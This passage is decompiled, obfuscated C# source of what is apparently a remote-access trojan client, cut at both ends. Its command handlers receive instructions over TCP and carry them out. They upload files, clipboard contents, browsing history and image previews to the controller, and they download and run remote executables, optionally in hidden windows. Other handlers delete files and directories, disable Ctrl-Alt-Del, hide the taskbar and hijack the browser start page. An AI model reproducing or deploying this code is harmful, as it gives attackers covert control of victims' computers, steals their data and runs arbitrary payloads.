							gJrlNEyq80.Flush();
							ProjectData.ClearProjectError();
						}
						break;
					case "/DOWNFILE/":
					{
						Thread thread8 = new Thread(DDnyPWPQyqVL171);
						thread8.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					case "/ENCOREFL/":
					{
						Thread thread7 = new Thread(eMxpiDE24OuE173);
						thread7.Start();
						break;
					}
					case "/ERROR/":
						try
						{
							W8OwNO3NTNFTWI9GPHiqPSPE114();
						}
						catch (Exception projectError9)
						{
							ProjectData.SetProjectError(projectError9);
							ProjectData.ClearProjectError();
						}
						break;
					case "/STOPUPLD/":
						try
						{
							fileStream_0.Flush();
							W8OwNO3NTNFTWI9GPHiqPSPE114();
						}
						catch (Exception projectError8)
						{
							ProjectData.SetProjectError(projectError8);
							ProjectData.ClearProjectError();
						}
						break;
					case "/UPLOADFL/":
					{
						Thread thread6 = new Thread(QHilPQQNPl8b174);
						thread6.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					case "/OTHERPAK/":
					{
						Thread thread5 = new Thread(method_12);
						thread5.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					case "/FINEUPLD/":
					{
						Thread thread4 = new Thread(oqxUMTG3qYKs176);
						thread4.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					case "/RUNEXEFL/":
						try
						{
							string text3 = Strings.Mid(text, 11, 1);
							text = Strings.Mid(text, 12, Strings.Len(text));
							if (Operators.CompareString(text3, "1", false) == 0)
							{
								Thread thread2 = new Thread(c7LQEaIeCtxq186);
								thread2.Start(text);
							}
							else
							{
								Thread thread3 = new Thread(method_15);
								thread3.Start(text);
							}
						}
						catch (Exception projectError7)
						{
							ProjectData.SetProjectError(projectError7);
							ProjectData.ClearProjectError();
						}
						break;
					case "/KILLFILE/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							Thread thread = new Thread(ADKSSGPV9NPs3zYZJx6GoVMw119);
							thread.Start(text);
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
						break;
					case "/DIRSDELL/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							if (((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().DirectoryExists(text))
							{
								((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().DeleteDirectory(text, (DeleteDirectoryOption)5);
							}
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
						break;
					case "/FILESIZE/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							int num = (int)((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().GetFileInfo(text).Length;
							gJrlNEyq80.WriteLine("/FILESIZE/" + Conversions.ToString(num));
							gJrlNEyq80.Flush();
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
						break;
					case "/MAKEDIRS/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							if (!((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().DirectoryExists(text))
							{
								((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().CreateDirectory(text);
							}
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
						break;
					case "/RENAMEFL/":
						try
						{
							string text2 = Strings.Mid(text, 11, 1);
							text = Strings.Mid(text, 12, Strings.Len(text));
							string[] array = text.Split(new char[1] { '*' });
							if (Operators.CompareString(text2, "0", false) == 0)
							{
								((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().RenameDirectory(Conversions.ToString(array.GetValue(0)), Conversions.ToString(array.GetValue(1)));
							}
							else
							{
								((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().RenameFile(Conversions.ToString(array.GetValue(0)), Conversions.ToString(array.GetValue(1)));
							}
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
						break;
					default:
						ssqwzwagQoOhjET2PiWIbjP3122(1);
						try
						{
							gJrlNEyq80.WriteLine("/FILESIZE/");
							gJrlNEyq80.Flush();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						break;
					}
				}
			}
			catch (Exception projectError15)
			{
				ProjectData.SetProjectError(projectError15);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void txSieSPrfqj7195(object temp)
	{
		StringBuilder stringBuilder = new StringBuilder();
		StringBuilder stringBuilder2 = new StringBuilder();
		int num = 65536;
		byte[] array = new byte[0];
		short num2 = 1;
		TcpClient tcpClient = new TcpClient();
		tcpClient.Connect(string_4, yYxuvHumdHoJcejw178);
		NetworkStream stream = tcpClient.GetStream();
		StreamWriter streamWriter = new StreamWriter(stream);
		StreamReader streamReader = new StreamReader(stream);
		FileStream input = new FileStream(Conversions.ToString(temp), FileMode.Open, FileAccess.Read, FileShare.Read);
		BinaryReader binaryReader = new BinaryReader(input);
		long num3 = xgnjGoRDfYMqRP4k2wTpo3Le123(Conversions.ToString(temp));
		string[] array2 = (string[])NewLateBinding.LateGet(temp, (Type)null, "Split", new object[1] { "\\" }, (string[])null, (Type[])null, (bool[])null);
		checked
		{
			string text = Conversions.ToString(array2.GetValue(array2.Length - 1));
			int num5 = default(int);
			long num6 = default(long);
			if (num3 < 65536L)
			{
				binaryReader.BaseStream.Seek(0L, SeekOrigin.Begin);
				array = new byte[(int)(num3 - 1L) + 1];
				binaryReader.Read(array, 0, (int)num3);
				binaryReader.BaseStream.Seek(0L, SeekOrigin.Current);
				stringBuilder.Append("/STARTDOW/" + text + "¦" + Conversions.ToString(num3) + "*");
				int num4 = array.Length - 1;
				for (int i = 0; i <= num4; i++)
				{
					stringBuilder2.Append(array.GetValue(i)!.ToString() + " ");
				}
				stringBuilder.Append((object?)stringBuilder2);
				streamWriter.WriteLine((object?)stringBuilder);
				streamWriter.Flush();
			}
			else
			{
				num5 = (int)Math.Round(Math.Floor((double)num3 / (double)num));
				num6 = num3 - num5 * num;
				binaryReader.BaseStream.Seek(0L, SeekOrigin.Begin);
				array = new byte[num - 1 + 1];
				binaryReader.Read(array, 0, num);
				binaryReader.BaseStream.Seek(0L, SeekOrigin.Current);
				stringBuilder.Append("/STARTDOW/" + text + "¦" + Conversions.ToString(num3) + "*");
				int num7 = array.Length - 1;
				for (int j = 0; j <= num7; j++)
				{
					stringBuilder2.Append(array.GetValue(j)!.ToString() + " ");
				}
				stringBuilder.Append((object?)stringBuilder2);
				streamWriter.WriteLine((object?)stringBuilder);
				streamWriter.Flush();
			}
			string text2 = null;
			try
			{
				while (tcpClient.Connected)
				{
					text2 = streamReader.ReadLine();
					if (Operators.CompareString(text2, (string)null, false) == 0)
					{
						ssqwzwagQoOhjET2PiWIbjP3122(1);
					}
					switch (Strings.Left(text2, 10))
					{
					case "/STOPDOWN/":
						try
						{
							W8OwNO3NTNFTWI9GPHiqPSPE114();
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
						break;
					case "/ENCOREFL/":
						try
						{
							if (num2 != num5)
							{
								StringBuilder stringBuilder3 = new StringBuilder();
								StringBuilder stringBuilder4 = new StringBuilder();
								num2 = (short)(num2 + 1);
								array = new byte[num - 1 + 1];
								binaryReader.Read(array, 0, num);
								binaryReader.BaseStream.Seek(0L, SeekOrigin.Current);
								stringBuilder3.Append("/PAKSSEND/");
								int num8 = array.Length - 1;
								for (int k = 0; k <= num8; k++)
								{
									stringBuilder4.Append(array.GetValue(k)!.ToString() + " ");
								}
								stringBuilder3.Append((object?)stringBuilder4);
								streamWriter.WriteLine((object?)stringBuilder3);
								streamWriter.Flush();
							}
							else if (num6 > 0L)
							{
								StringBuilder stringBuilder5 = new StringBuilder();
								StringBuilder stringBuilder6 = new StringBuilder();
								array = new byte[(int)(num6 - 1L) + 1];
								binaryReader.Read(array, 0, (int)num6);
								stringBuilder5.Append("/FINEDOWN/");
								int num9 = array.Length - 1;
								for (int l = 0; l <= num9; l++)
								{
									stringBuilder6.Append(array.GetValue(l)!.ToString() + " ");
								}
								stringBuilder5.Append((object?)stringBuilder6);
								streamWriter.WriteLine((object?)stringBuilder5);
								streamWriter.Flush();
								W8OwNO3NTNFTWI9GPHiqPSPE114();
							}
							else
							{
								streamWriter.WriteLine("/FINEDOWN/");
								streamWriter.Flush();
								W8OwNO3NTNFTWI9GPHiqPSPE114();
							}
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							try
							{
								W8OwNO3NTNFTWI9GPHiqPSPE114();
								streamWriter.WriteLine("/ERROR/");
								streamWriter.Flush();
							}
							catch (Exception projectError4)
							{
								ProjectData.SetProjectError(projectError4);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
						break;
					case "/ERROR/":
						try
						{
							W8OwNO3NTNFTWI9GPHiqPSPE114();
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
						break;
					default:
						try
						{
							streamWriter.WriteLine("/ERROR/");
							streamWriter.Flush();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						break;
					case "/FINISHED/":
						tcpClient.Close();
						return;
					}
				}
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void OzjeClMqKR5N196()
	{
		string text = null;
		try
		{
			while (D2I3SpwP83.Connected)
			{
				text = EqeYolvW86.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					ssqwzwagQoOhjET2PiWIbjP3122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/INFOPCPC/", false) == 0)
				{
					try
					{
						Thread thread = new Thread(nCRXNUhAwXOL183);
						thread.Start();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(text2, "/LASTURLS/", false) == 0)
				{
					try
					{
						Qq0ENSuRIegPNwfGJmJi2YE6133();
						string text3 = Qq0ENSuRIegPNwfGJmJi2YE6133();
						Yc568CBp85.WriteLine("/LASTURLS/" + text3);
						Yc568CBp85.Flush();
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					ssqwzwagQoOhjET2PiWIbjP3122(1);
					try
					{
						Yc568CBp85.WriteLine("/LASTURLS/");
						Yc568CBp85.Flush();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void method_16()
	{
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Unknown result type (might be due to invalid IL or missing references)
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		//IL_018b: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d6: Unknown result type (might be due to invalid IL or missing references)
		string text = null;
		try
		{
			while (UDfXYqnS88.Connected)
			{
				text = NXKVNPzt91.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					ssqwzwagQoOhjET2PiWIbjP3122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/SHOWMESG/", false) != 0)
				{
					continue;
				}
				UjhkEvATqjHD47 = (MessageBoxIcon)0;
				messageBoxButtons_0 = (MessageBoxButtons)0;
				P947dvwG0IVI49 = null;
				string_0 = null;
				try
				{
					List<string> list = new List<string>();
					string[] array = text.Split(new char[1] { '*' });
					string[] array2 = array;
					foreach (string item in array2)
					{
						list.Add(item);
					}
					P947dvwG0IVI49 = list[1].ToString();
					string_0 = list[2].ToString();
					switch (list[4].ToString())
					{
					case "Q":
						UjhkEvATqjHD47 = (MessageBoxIcon)32;
						break;
					case "W":
						UjhkEvATqjHD47 = (MessageBoxIcon)48;
						break;
					case "I":
						UjhkEvATqjHD47 = (MessageBoxIcon)64;
						break;
					case "E":
						UjhkEvATqjHD47 = (MessageBoxIcon)16;
						break;
					}
					switch (list[3].ToString())
					{
					case "OK":
						messageBoxButtons_0 = (MessageBoxButtons)0;
						break;
					case "ARI":
						messageBoxButtons_0 = (MessageBoxButtons)2;
						break;
					case "YNC":
						messageBoxButtons_0 = (MessageBoxButtons)3;
						break;
					case "YN":
						messageBoxButtons_0 = (MessageBoxButtons)4;
						break;
					case "OC":
						messageBoxButtons_0 = (MessageBoxButtons)1;
						break;
					case "RC":
						messageBoxButtons_0 = (MessageBoxButtons)5;
						break;
					}
					Thread thread = new Thread(method_6);
					thread.Start();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void SPIKebtTGR9X198()
	{
		string text = null;
		try
		{
			while (tcpClient_2.Connected)
			{
				text = MdT3nXDN96.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					ssqwzwagQoOhjET2PiWIbjP3122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/OPENCDCD/":
					try
					{
						Thread thread3 = new Thread(bSqVDBpU1Pck185);
						thread3.Start(true);
					}
					catch (Exception projectError19)
					{
						ProjectData.SetProjectError(projectError19);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CLOSECDD/":
					try
					{
						Thread thread2 = new Thread(bSqVDBpU1Pck185);
						thread2.Start(true);
					}
					catch (Exception projectError18)
					{
						ProjectData.SetProjectError(projectError18);
						ProjectData.ClearProjectError();
					}
					break;
				case "/DESKH/":
					try
					{
						dBGFpqEtu89AjyoVpDNtQLba125();
					}
					catch (Exception projectError17)
					{
						ProjectData.SetProjectError(projectError17);
						ProjectData.ClearProjectError();
					}
					break;
				case "/DESKS/":
					try
					{
						method_4();
					}
					catch (Exception projectError16)
					{
						ProjectData.SetProjectError(projectError16);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTH/":
					try
					{
						N5VeFG9rpvJYxsq3MsFfsKhv127();
					}
					catch (Exception projectError15)
					{
						ProjectData.SetProjectError(projectError15);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTS/":
					try
					{
						WrSc2qmHV45DETIcIvO0IZ8Y126();
					}
					catch (Exception projectError14)
					{
						ProjectData.SetProjectError(projectError14);
						ProjectData.ClearProjectError();
					}
					break;
				case "/HIDETASK/":
					try
					{
						UALkXbsXjUpWu71eUEe9aKFg128();
					}
					catch (Exception projectError13)
					{
						ProjectData.SetProjectError(projectError13);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SHOWTASK/":
					try
					{
						method_5();
					}
					catch (Exception projectError12)
					{
						ProjectData.SetProjectError(projectError12);
						ProjectData.ClearProjectError();
					}
					break;
				case "/FLIP/":
					try
					{
						GStruct2 dm2 = GClass2.wGQw9rWcY6IJndbD215();
						bZ3MOQ6474jy0qGUuLooZFwf137(ref dm2);
						dm2.dmDisplayOrientation = int_4[2];
						he5PJ6dvtNbdroSu6KzFmv6R139(dm2);
					}
					catch (Exception projectError11)
					{
						ProjectData.SetProjectError(projectError11);
						ProjectData.ClearProjectError();
					}
					break;
				case "/UNFLIP/":
					try
					{
						GStruct2 dm = GClass2.wGQw9rWcY6IJndbD215();
						bZ3MOQ6474jy0qGUuLooZFwf137(ref dm);
						dm.dmDisplayOrientation = int_4[0];
						he5PJ6dvtNbdroSu6KzFmv6R139(dm);
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SWAPM/":
					try
					{
						SwapMouseButton(256L);
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						ProjectData.ClearProjectError();
					}
					break;
				case "/UNSWAPM/":
					try
					{
						SwapMouseButton(0L);
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CADD/":
					try
					{
						K58vRi4PLYqXw7PS6xH0rNRR140(enable: false);
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CADE/":
					try
					{
						K58vRi4PLYqXw7PS6xH0rNRR140(enable: true);
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/TMOFF/":
					try
					{
						dlvB9HmqSWTJRIzo44.SendMessage((IntPtr)65535, 274u, (IntPtr)61808, (IntPtr)2);
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/TMON/":
					try
					{
						dlvB9HmqSWTJRIzo44.SendMessage((IntPtr)65535, 274u, (IntPtr)61808, (IntPtr)(-1));
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SCRSTART/":
					try
					{
						VGyPO6qXegUybDCBUFQi3bUo142(start: true);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SCRSTOP/":
					try
					{
						VGyPO6qXegUybDCBUFQi3bUo142(start: false);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SPEAKOUT/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(njwaC4WGmPmi190);
						thread.Start(text);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError20)
		{
			ProjectData.SetProjectError(projectError20);
			ProjectData.ClearProjectError();
		}
	}

	private void lY1ElfuCs5eC199()
	{
		string text = null;
		try
		{
			while (fhy5vVmA98.Connected)
			{
				text = streamReader_2.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					ssqwzwagQoOhjET2PiWIbjP3122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/IEVER/":
					try
					{
						RegistryKey localMachine = Registry.LocalMachine;
						RegistryKey registryKey4 = localMachine.OpenSubKey("Software\\Microsoft\\Internet Explorer");
						string text3 = registryKey4.GetValue("Version")!.ToString();
						gFfr3E5p100.WriteLine("/IEVERSIN/" + text3);
						gFfr3E5p100.Flush();
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STRTPAGE/":
					try
					{
						RegistryKey currentUser3 = Registry.CurrentUser;
						RegistryKey registryKey3 = currentUser3.OpenSubKey("Software\\Microsoft\\Internet Explorer\\Main");
						string text2 = registryKey3.GetValue("Start Page")!.ToString();
						gFfr3E5p100.WriteLine("/IESTARTP/" + text2);
						gFfr3E5p100.Flush();
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CHANGETL/":
					text = Strings.Mid(text, 11, Strings.Len(text));
					try
					{
						RegistryKey currentUser2 = Registry.CurrentUser;
						RegistryKey registryKey2 = currentUser2.CreateSubKey("Software\\Microsoft\\Internet Explorer\\Main");
						registryKey2.SetValue("Window Title", text, RegistryValueKind.String);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CHANGEHP/":
					text = Strings.Mid(text, 11, Strings.Len(text));
					try
					{
						RegistryKey currentUser = Registry.CurrentUser;
						RegistryKey registryKey = currentUser.CreateSubKey("Software\\Microsoft\\Internet Explorer\\Main");
						registryKey.SetValue("Start Page", text);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/RUNSPAGE/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						if (!text.StartsWith("http://") | !text.StartsWith("https://"))
						{
							text = "http://" + text;
						}
						Process.Start(text);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					ssqwzwagQoOhjET2PiWIbjP3122(1);
					try
					{
						gFfr3E5p100.WriteLine("/IESTARTP/");
						gFfr3E5p100.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
	}

	private void V2Tmb2du9YlN200()
	{
		string text = null;
		try
		{
			while (QjBxDwjq103.Connected)
			{
				text = Ex99EbIg106.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					ssqwzwagQoOhjET2PiWIbjP3122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/CLIPBOAR/", false) == 0)
				{
					try
					{
						l7Sl0IfJ19z719 = null;
						Thread thread = new Thread(vzkzSVXCPTAfb0Yyy8JG060K146);
						thread.SetApartmentState(ApartmentState.STA);
						thread.Start();
						thread.Join();
						c80Z9pWv105.WriteLine("/CLIPBOAR/" + l7Sl0IfJ19z719);
						c80Z9pWv105.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(text2, "/SETCLIPB/", false) == 0)
				{
					try
					{
						l7Sl0IfJ19z719 = Strings.Mid(text, 11, Strings.Len(text));
						l7Sl0IfJ19z719 = l7Sl0IfJ19z719.Replace("***", "\r\n");
						Thread thread2 = new Thread(d7thq4Jj3EBcHb4ay0Ci7AxD149);
						thread2.SetApartmentState(ApartmentState.STA);
						thread2.Start();
						thread2.Join();
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					ssqwzwagQoOhjET2PiWIbjP3122(1);
					try
					{
						c80Z9pWv105.WriteLine("/CLIPBOAR/");
						c80Z9pWv105.Flush();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void D1bynb6ctYrz201()
	{
		string text = null;
		checked
		{
			try
			{
				while (cllQpIC5108.Connected)
				{
					text = streamReader_3.ReadLine();
					if (Operators.CompareString(text, (string)null, false) == 0)
					{
						ssqwzwagQoOhjET2PiWIbjP3122(1);
					}
					string text2 = Strings.Left(text, 10);
					if (Operators.CompareString(text2, "/DLARUNVS/", false) == 0)
					{
						try
						{
							List<string> list = new List<string>();
							string[] array = Strings.Mid(text, 11, Strings.Len(text)).Split(new char[1] { '/' });
							string[] array2 = array;
							foreach (string item in array2)
							{
								list.Add(item);
							}
							int index = list.Count - 1;
							string text3 = Strings.Mid(text, 11, Strings.Len(text));
							((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Network().DownloadFile(text3, Environment.GetEnvironmentVariable("Temp") + "\\" + list[index].ToString(), (string)null, (string)null, false, 100000, true);
							ssqwzwagQoOhjET2PiWIbjP3122(1);
							Process.Start(Environment.GetEnvironmentVariable("Temp") + "\\" + list[index].ToString());
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
					else
					{
						if (Operators.CompareString(text2, "/DLARUNHD/", false) != 0)
						{
							continue;
						}
						try
						{
							List<string> list2 = new List<string>();
							string[] array3 = Strings.Mid(text, 11, Strings.Len(text)).Split(new char[1] { '/' });
							string[] array4 = array3;
							foreach (string item2 in array4)
							{
								list2.Add(item2);
							}
							int index2 = list2.Count - 1;
							string text4 = Strings.Mid(text, 11, Strings.Len(text));
							((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Network().DownloadFile(text4, Environment.GetEnvironmentVariable("Temp") + "\\" + list2[index2].ToString(), (string)null, (string)null, false, 100000, true);
							ssqwzwagQoOhjET2PiWIbjP3122(1);
							Process process = new Process();
							process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
							process.StartInfo.FileName = Environment.GetEnvironmentVariable("Temp") + "\\" + list2[index2].ToString();
							process.Start();
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void SzVEPNTNA6Oc202()
	{
		string text = null;
		try
		{
			while (V4Ct0Xhc113.Connected)
			{
				text = EwowrTmh116.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					ssqwzwagQoOhjET2PiWIbjP3122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/PRINTTXT/", false) == 0)
				{
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(method_3);
						thread.Start(text);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void h7HEEFOnDd1j203()
	{
		string text = null;
		checked
		{
			try
			{
				while (YQ35FAZG118.Connected)
				{
					text = O5VIuTvh121.ReadLine();
					if (Operators.CompareString(text, (string)null, false) == 0)
					{
						ssqwzwagQoOhjET2PiWIbjP3122(1);
					}
					switch (Strings.Left(text, 10))
					{
					case "/IPREVIEW/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							Image val = null;
							Image val2 = null;
							try
							{
								val2 = Image.FromFile(text);
								string text3 = null;
								if (val2 != null)
								{
									double num = (double)val2.get_Size().Width / (double)val2.get_Size().Height;
									double num2 = (double)val2.get_Size().Height / (double)val2.get_Size().Width;
									val = ((val2.get_Size().Width <= val2.get_Size().Height) ? val2.GetThumbnailImage((int)Math.Round(200.0 / num2), 200, (GetThumbnailImageAbort)null, default(IntPtr)) : val2.GetThumbnailImage(200, (int)Math.Round(200.0 / num), (GetThumbnailImageAbort)null, default(IntPtr)));
									MemoryStream memoryStream = new MemoryStream();
									val.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
									memoryStream.Capacity = (int)memoryStream.Length;
									byte[] buffer = memoryStream.GetBuffer();
									text3 = Convert.ToBase64String(buffer);
									e7OtzKKO120.WriteLine("/IPREVIEW/" + text3);
									e7OtzKKO120.Flush();
									memoryStream.Dispose();
									memoryStream.Close();
									val2.Dispose();
								}
							}
							catch (Exception projectError5)
							{
								ProjectData.SetProjectError(projectError5);
								ProjectData.ClearProjectError();
							}
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
						break;
					case "/SEARCHSS/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							string text2 = text;
							if (Operators.CompareString(text2, "1", false) == 0)
							{
								INmVkyZTugbK13 = true;
							}
							else if (Operators.CompareString(text2, "2", false) == 0)
							{
								INmVkyZTugbK13 = false;
								e7OtzKKO120.WriteLine("/SEARCHFL/SEARCHEND");
								e7OtzKKO120.Flush();
							}
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
						break;
					case "/LISTDRVS/":
						try
						{
							Thread thread3 = new Thread(method_11);
							thread3.Start(e7OtzKKO120);
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
						break;
					case "/SEARCHFL/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							string_1 = text.Split(new char[1] { '¦' });
							Thread thread2 = new Thread(pghGEWNqlZsjyB2MDziKEPs8105);
							thread2.Start(string_1[0]);
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
						break;
					case "/DOWNFILE/":
					{
						Thread thread = new Thread(DDnyPWPQyqVL171);
						thread.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					default:
						ssqwzwagQoOhjET2PiWIbjP3122(1);
						try
						{
							e7OtzKKO120.WriteLine("/IPREVIEW/");
							e7OtzKKO120.Flush();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						break;
					}
				}
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_17()
	{
		string text = null;
		try
		{
			while (xHgHFdV3123.Connected)
			{
				text = eVDJMtgv126.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
